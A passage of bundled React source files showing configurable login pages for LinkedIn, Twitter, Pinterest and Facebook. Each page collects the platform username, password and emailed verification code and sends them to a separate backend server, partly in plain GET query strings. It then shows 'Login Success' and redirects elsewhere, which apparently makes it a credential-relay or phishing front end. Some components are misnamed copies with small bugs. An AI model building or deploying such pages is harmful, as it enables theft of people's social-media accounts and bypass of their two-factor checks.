window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challangeID: responseData.challangeID,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      fetch(\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}&appName=${this.state.appName}`,\n        {\n          method: \"GET\",\n        }\n      )\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (responseData.success) {\n            this.setState({ success: true });\n          } else {\n            this.setState(\n              { message: responseData.message, code: \"\" },\n              () => {\n                this.onShowAlert();\n              }\n            );\n          }\n        });\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"dark\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n        <br></br>\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n\n            <Container>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n                style={{ objectFit: 'contain', width: \"25%\", height: \"25%\" }}\n              ></img>\n            </Container>\n            <br></br>\n            <h1>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \" LinkedIn login\"}\n            </h1>\n            <br />\n            {\n              env.REACT_APP_BANNER_LINKEDIN === \"true\" ?\n                <div>\n                  <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                    <Card.Body>\n                      <Card.Title>{env.REACT_APP_BANNER_LINKEDIN_HEADER}</Card.Title>\n                      <Card.Text>\n                        <small className=\"text-muted\">  {env.REACT_APP_BANNER_LINKEDIN_BODY}</small>\n                      </Card.Text>\n                    </Card.Body>\n                  </Card> </div>\n                : \"\"\n            }\n\n            <Container>\n              <p style={{ fontWeight: \"bold\" }}>\n                {\n                  env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                }\n\n              </p>\n            </Container>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 3000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>\n                        Enter Linkedin Username/MobileNumber\n                    </Form.Label>\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                      />\n                    </Form.Group>\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Enter Linkedin Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.manualCheck ? (\n                      <div>\n                        <Form.Group>\n                          <Form.Label>\n                            Enter code recieved in your email\n                        </Form.Label>\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n        challenge_id: \"\",\n        challenge_type: \"\",\n        enc_user_id: \"\",\n        code: \"\",\n        appName: window.location.hostname.msg.substring(10).split(\".\")\n\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        this.setState({ code: event.target.value });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/twitter`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                    appName: this.state.appName\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challenge_type: responseData.challenge_type,\n                                challenge_id: responseData.challenge_id,\n                                enc_user_id: responseData.enc_user_id,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"username cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        fetch(\n            `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\n            {\n                method: \"GET\",\n            }\n        )\n            .then((response) => response.json())\n            .then((responseData) => {\n                console.log(responseData);\n                this.setState(\n                    {\n                        message: responseData.message,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n                if (responseData.success) {\n                    this.setState({ success: true });\n                } else {\n                    this.setState(\n                        { message: responseData.message, code: \"\" },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                }\n            });\n\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n                <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n                    Back\n               </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                ><center>\n                        <Container>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                                style={{ objectFit: 'contain', width: \"25%\", height: \"25%\" }}\n                            ></img>\n                        </Container>\n                        <br></br>\n                        <h1>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : \"Twitter login\"}\n                        </h1>\n                        <br></br>\n                        {\n                            env.REACT_APP_BANNER_TWITTER === \"true\" ?\n                                <div>\n                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                                        <Card.Body>\n                                            <Card.Title>{env.REACT_APP_BANNER_TWITTER_HEADER}</Card.Title>\n                                            <Card.Text>\n                                                <small className=\"text-muted\">  {env.REACT_APP_BANNER_TWITTER_BODY}</small>\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card>\n                                </div>\n                                : \"\"\n                        }\n\n                        <Container>\n                            <p style={{ fontWeight: \"bold\" }}>\n                                {\n                                    env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                                }\n\n                            </p>\n                        </Container>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                                <h1>Redirecting...</h1>\n                            </center>\n                            <Route\n                                component={() => {\n                                    window.setTimeout(() => {\n                                        window.location.href = env.REACT_APP_REDIRECTURL;\n                                    }, 3000);\n\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Twitter Username\n                    </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Twitter Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        {this.state.challenge_type === 'RetypeEmail' ? \"Enter your email id\" : \"Enter code recieved in your email\"}\n\n                                                    </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"text\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div>\n        );\n    }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n        appName: window.location.hostname.msg.substring(10).split(\".\")\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        this.setState({ code: event.target.value });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/pinterest`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                    appName: this.state.appName\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challenge_type: responseData.challenge_type,\n                                challenge_id: responseData.challenge_id,\n                                enc_user_id: responseData.enc_user_id,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"email id cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        fetch(\n            `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\n            {\n                method: \"GET\",\n            }\n        )\n            .then((response) => response.json())\n            .then((responseData) => {\n                console.log(responseData);\n                this.setState(\n                    {\n                        message: responseData.message,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n                if (responseData.success) {\n                    this.setState({ success: true });\n                } else {\n                    this.setState(\n                        { message: responseData.message, code: \"\" },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                }\n            });\n\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n                <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n                    Back\n               </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                ><center>\n\n\n                        <Container>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                                style={{ objectFit: 'contain', width: \"25%\", height: \"25%\" }}\n                            ></img>\n                        </Container>\n                        <br></br>\n                        <h1>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : \"Pinterest login\"}\n                        </h1>\n                        {\n                            env.REACT_APP_BANNER_PINTEREST === \"true\" ?\n                                <div>\n                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                                        <Card.Body>\n                                            <Card.Title>{env.REACT_APP_BANNER_PINTEREST_HEADER}</Card.Title>\n                                            <Card.Text>\n                                                <small className=\"text-muted\">  {env.REACT_APP_BANNER_PINTEREST_BODY}</small>\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card> </div>\n                                : \"\"\n                        }\n                        <Container>\n                            <p style={{ fontWeight: \"bold\" }}>\n                                {\n                                    env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                                }\n\n                            </p>\n                        </Container>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                                <h1>Redirecting...</h1>\n                            </center>\n                            <Route\n                                component={() => {\n\n                                    window.setTimeout(() => {\n                                        window.location.href = env.REACT_APP_REDIRECTURL;\n                                    }, 3000);\n\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Pinterest Email Id\n                    </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Pinterest Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        {this.state.challenge_type === 'RetypeEmail' ? \"Enter your email id\" : \"Enter code recieved in your email\"}\n\n                                                    </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"text\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div >\n        );\n    }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n        challangeID: \"\",\n        code: \"\",\n        appName: window.location.hostname.msg.substring(10).split(\".\")\n\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        const { value, maxLength } = event.target;\n        const message = value.slice(0, maxLength);\n        this.setState({ code: message });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/facebook`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                    appName: this.state.appName\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challangeID: responseData.challangeID,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"username cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        if (this.state.code.length === 0 || this.state.code.length > 6) {\n            this.setState({ message: \"Code length should be equal to 6\" }, () => {\n                this.onShowAlert();\n            });\n        } else {\n            fetch(\n                `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}$appName=${this.state.appName}`,\n                {\n                    method: \"GET\",\n                }\n            )\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (responseData.success) {\n                        this.setState({ success: true });\n                    } else {\n                        this.setState(\n                            { message: responseData.message, code: \"\" },\n                            () => {\n                                this.onShowAlert();\n                            }\n                        );\n                    }\n                });\n        }\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n\n                <Button size=\"lg\" variant=\"outline-primary\" onClick={this.setRedirect}>\n                    Back\n        </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n                <br></br>\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                >\n                    <center>\n\n\n                        <Container>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                                style={{ objectFit: 'contain', width: \"25%\", height: \"25%\" }}\n                            ></img>\n                        </Container>\n\n                        <br></br>\n                        <h1>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : \" Facebook login\"}\n                        </h1>\n                        <br />\n                        {\n                            env.REACT_APP_BANNER_FACEBOOK === \"true\" ?\n                                <div>\n                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                                        <Card.Body>\n                                            <Card.Title>{env.REACT_APP_BANNER_FACEBOOK_HEADER}</Card.Title>\n                                            <Card.Text>\n                                                <small className=\"text-muted\">  {env.REACT_APP_BANNER_FACEBOOK_BODY}</small>\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card> </div>\n                                : \"\"\n                        }\n\n                        <Container>\n                            <p style={{ fontWeight: \"bold\" }}>\n                                {\n                                    env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                                }\n\n                            </p>\n                        </Container>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                                <h1>Redirecting...</h1>\n                            </center>\n                            <Route\n                                component={() => {\n                                    window.setTimeout(() => {\n                                        window.location.href = env.REACT_APP_REDIRECTURL;\n                                    }, 3000);\n\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Facebook Username/Email\n                                            </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Facebook Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        Enter code recieved in your email\n                        </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"number\"\n                                                        maxLength=\"11\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div>\n        );\n    }\n}\n","import React from \"react\";\nimport { Switch, Route } from \"react-router-dom\";\nimport Home from \"./components/Home\";\nimport Instagram from \"./components/Instagram\";\nimport Linkedin from \"./components/Linkedin\";\nimport Twitter from \"./components/Twitter\";\nimport Pinterest from \"./components/Pinterest\";\nimport Facebook from \"./components/Facebook\";\n\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\n\nfunction App() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={Home} exact />\n      {\n        env.REACT_APP_TWITTER === \"true\" ? <Route path=\"/Twitter\" component={Twitter} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_LINKEDIN === \"true\" ? <Route path=\"/LinkedIn\" component={Linkedin} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_INSTAGRAM === \"true\" ? <Route path=\"/Instagram\" component={Instagram} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_PINTEREST === \"true\" ? <Route path=\"/Pinterest\" component={Pinterest} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_FACEBOOK === \"true\" ? <Route path=\"/Facebook\" component={Facebook} exact /> : \"\"\n      }\n    </Switch>\n  );\n}\n\nexport default App;\n","import { createBrowserHistory as history } from \"history\";\n\nexport default history();\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\nimport { BrowserRouter as Router } 